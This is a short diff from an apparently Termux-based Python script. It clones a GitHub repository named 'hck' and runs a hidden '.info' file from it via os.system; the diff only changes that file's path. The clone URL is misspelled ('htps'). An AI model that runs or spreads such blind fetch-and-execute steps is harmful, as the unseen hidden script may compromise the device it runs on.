@@ -95,7 +95,7 @@ def z():
     time.sleep(1)
     os.system("git clone htps://github.com/rasooli300/hck")
     
-    os.system("python /data/data/com.termux/files/home/hck/.info")
+    os.system("python /data/data/com.termux/files/home/Gh/hck/.info")
 if __name__=="__main__":
     u()
 
